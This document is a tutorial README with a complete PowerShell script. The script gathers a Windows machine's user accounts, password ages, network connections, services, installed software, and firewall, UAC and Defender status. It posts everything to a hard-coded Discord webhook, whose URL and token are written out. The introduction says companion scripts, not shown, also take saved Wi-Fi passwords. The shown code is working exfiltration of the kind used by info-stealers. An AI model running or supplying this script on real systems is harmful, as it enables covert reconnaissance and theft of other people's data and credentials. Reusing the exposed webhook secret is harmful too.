Introduction
This project contains scripts to gather detailed system information and Wi-Fi profiles along with their passwords, and send this information to a specified Discord webhook. The scripts are divided into two PowerShell scripts and one batch file for execution.

Prerequisites:
- Windows OS
- PowerShell
- Discord

# Step 1:
## Install discord, and setup a channel to recieve the messages.
1. Once you have a channel setup go to the setting of it and under "integrations" you will see the webhook option.
2. Select it and create a New Webhook.
3. Once you've created it, go ahead and copy the link for it. We will be using this later.

# Step 2:
## Now we want to setup our first powershell file.
1. Create a empty .ps1 file using either Notepad++, VSCode, or any other IDS of your choice.
2. Paste the following code into it and save it out.
```powershell
# Define Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1265363802812186676/K6uFVQG_nbJF6bK3-WrVK-fY-D9Yd1LCNex64X8a9KyxquWgQcsZ5U6Kh9csHlS_nmjE"

# Function to send a message to Discord webhook
function Send-DiscordWebhook {
    param (
        [string]$WebhookUrl,
        [string]$Message
    )

    $Payload = @{
        "content" = $Message
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType 'application/json' -Body $Payload
        Write-Host "Sending Message to Discord"
    } catch {
        Write-Host "Failed to send info..: $_"
    }
}

# Function to check and install required modules
function Install-RequiredModules {
    $requiredModules = @("NetTCPIP", "ImportExcel")  # Add any additional modules here if needed

    foreach ($module in $requiredModules) {
        if (-not (Get-Module -Name $module -ListAvailable)) {
            Write-Host "Installing module: $module"
            Install-Module -Name $module -Force -Scope CurrentUser -Confirm:$false
        }
    }
}

# Check and install required modules
Install-RequiredModules

# Import the ImportExcel module for Excel functionality
Import-Module ImportExcel

# Function to gather all usernames and password policies on the device
function Get-UserPasswordPolicies {
    $usernames = Get-WmiObject Win32_UserAccount | Select-Object -Property Name, PasswordExpires, PasswordRequired, LastLogin | ForEach-Object {
        $name = $_.Name
        $passwordExpires = $_.PasswordExpires
        $passwordRequired = $_.PasswordRequired
        $lastLogin = $_.LastLogin
        $passwordAge = ([datetime]::Now - [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity([System.DirectoryServices.AccountManagement.ContextType]::Machine, $name).LastPasswordSet).Days
        
        [PSCustomObject]@{
            Name = $name
            PasswordExpires = $passwordExpires
            PasswordRequired = $passwordRequired
            LastPasswordChange = $passwordAge
            LastLogin = $lastLogin
        }
    }
    return $usernames
}

# Function to get the public IP address
function Get-PublicIP {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
        return $response.ip
    } catch {
        Write-Host "Failed to retrieve public IP address. Error: $_"
        return "Unavailable"
    }
}

# Function to gather system information
function Get-ServerInfo {
    # Get CPU and RAM usage
    $cpuUsage = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty LoadPercentage
    $ramUsage = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty FreePhysicalMemory

    # Get network information
    $networkInfo = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object IPAddress, DNSHostName, Description

    # Separate IPv4 and IPv6 addresses
    $ipv4Addresses = @()
    $ipv6Addresses = @()

    foreach ($network in $networkInfo) {
        foreach ($ip in $network.IPAddress) {
            if ($ip -match '\d+\.\d+\.\d+\.\d+') {
                $ipv4Addresses += $ip
            } elseif ($ip -match '[0-9a-fA-F:]+') {
                $ipv6Addresses += $ip
            }
        }
    }

    # Get TCP connection information
    $tcpConnections = Get-NetTCPConnection | Where-Object { $_.State -in @("Listen", "Established", "Close_Wait") } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State

    # Get disk usage information
    $diskInfo = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID, @{Name="FreeSpace(GB)";Expression={[math]::truncate($_.FreeSpace / 1GB)}}, @{Name="Size(GB)";Expression={[math]::truncate($_.Size / 1GB)}}, @{Name="UsedSpace(GB)";Expression={[math]::truncate(($_.Size - $_.FreeSpace) / 1GB)}}

    # Get service statuses
    $services = Get-Service | Select-Object DisplayName, Status

    # Get performance metrics (example: CPU usage)
    $cpuMetrics = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object -ExpandProperty CookedValue
    $cpuUsagePercent = [math]::Round($cpuMetrics, 2)

    # Get user information
    $usersInfo = Get-WmiObject Win32_UserAccount | Select-Object Name, LastLogin

    # Get hardware information
    $hardwareInfo = Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model, TotalPhysicalMemory

    # Get security settings
    $firewallStatus = (Get-NetFirewallProfile -Profile Domain,Public,Private).Enabled -join ", "
    $uacStatus = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA

    # Get installed software
    $installedSoftware = Get-WmiObject -Class Win32_Product | Select-Object Name, Version

    # Get system uptime
    $uptime = (Get-WmiObject -Class Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime)
    $uptimeDays = (New-TimeSpan -Start $uptime -End (Get-Date)).Days

    # Get Windows Defender status
    $defenderStatus = Get-MpComputerStatus | Select-Object AMServiceEnabled, AMServiceVersion, NISServiceEnabled, NISSignatureLastUpdated, RealTimeProtectionEnabled

    # Get all usernames and password policies on the device
    $userPasswordPolicies = Get-UserPasswordPolicies

    # Get public IP address
    $publicIP = Get-PublicIP

    # Combine all information into a single object
    $systemInfo = New-Object PSObject -Property @{
        "CPU Usage (%)" = $cpuUsage
        "RAM Usage (MB free)" = $ramUsage / 1MB
        "IPv4 Addresses" = $ipv4Addresses -join ", "
        "IPv6 Addresses" = $ipv6Addresses -join ", "
        "Public IP Address" = $publicIP
        "TCP Connections" = $tcpConnections | Out-String
        "Disk Usage" = $diskInfo | Out-String
        "Services Status" = $services | Out-String
        "Users Info" = $usersInfo | Out-String
        "Hardware Info" = $hardwareInfo | Out-String
        "Firewall Status" = $firewallStatus
        "UAC Status" = $uacStatus
        "Installed Software" = $installedSoftware | Out-String
        "System Uptime (Days)" = $uptimeDays
        "Windows Defender Status" = $defenderStatus | Out-String
        "User Password Policies" = $userPasswordPolicies | Out-String
    }

    return $systemInfo
}

# Get system information
$systemInfo = Get-ServerInfo

# Prepare the message body
$body = @"
CPU Usage: $($systemInfo."CPU Usage (%)") %
RAM Usage: $($systemInfo."RAM Usage (MB free)") MB free
Network Info:
IPv4 Addresses: $($systemInfo."IPv4 Addresses")
IPv6 Addresses: $($systemInfo."IPv6 Addresses")
Public IP Address: $($systemInfo."Public IP Address")

TCP Connections:
$($systemInfo."TCP Connections")

Disk Usage:
$($systemInfo."Disk Usage")

Services Status:
$($systemInfo."Services Status")

Users Info:
$($systemInfo."Users Info")

Hardware Info:
$($systemInfo."Hardware Info")

Firewall Status: $($systemInfo."Firewall Status")
UAC Status: $($systemInfo."UAC Status")

Installed Software:
$($systemInfo."Installed Software")

System Uptime (Days): $($systemInfo."System Uptime (Days)")
Windows Defender Status:
$($systemInfo."Windows Defender Status")

User Password Policies:
$($systemInfo."User Password Policies")
"@

# Split the message if it's too long for Discord
function Split-Message {
    param (
        [string]$Message,
        [int]$MaxLength
    )

    $messages = @()
    while ($Message.Length -gt $MaxLength) {
        $part = $Message.Substring(0, $MaxLength)
        $lastNewLineIndex = $part.LastIndexOf("`n")
        if ($lastNewLineIndex -gt -1) {
            $part = $part.Substring(0, $lastNewLineIndex)
        }
        $messages += $part
        $Message = $Message.Substring($part.Length).TrimStart()
    }
    $messages += $Message
    return $messages
}

# Send the messages to Discord
$messages = Split-Message -Message $body -MaxLength 2000
foreach ($msg in $messages) {
    Send-DiscordWebhook -WebhookUrl $webhookUrl -Message $msg
}
```


